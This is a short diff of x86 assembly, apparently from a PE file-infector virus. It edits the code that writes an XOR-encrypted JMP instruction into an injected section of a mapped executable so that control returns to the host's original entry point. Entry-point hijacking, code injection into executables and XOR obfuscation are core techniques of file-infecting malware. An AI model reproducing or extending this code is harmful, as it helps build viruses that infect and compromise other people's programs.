@@ -55,7 +55,7 @@ cmp	ecx, 0
 jg	patchNewDword
 
 ; CREATING JUMP TO OLD ENTRY POINT
-mov	edi, threadProgram - toInject ; Offset jmp
+mov	edi, goToEntryPoint - toInject ; Offset jmp
 add	edi, [DELTA PeFileMap] ; Add base filemap
 add	edi, [DELTA PointerToRawData] ; Add section offset
 mov	eax, 0E9h ; JMP rel32 OPCODE
@@ -63,7 +63,7 @@ xor	eax, [DELTA XorCrypt] ; Encrypt
 stosb
 mov	eax, [DELTA OldEntryPoint] ; Entry point address
 sub	eax, [DELTA VirtualAddress]
-mov	esi, threadProgram - toInject
+mov	esi, goToEntryPoint - toInject
 sub	eax, esi
 sub	eax, 05h ; Add 5 bytes for JMP
 xor	eax, [DELTA XorCrypt] ; encrypt
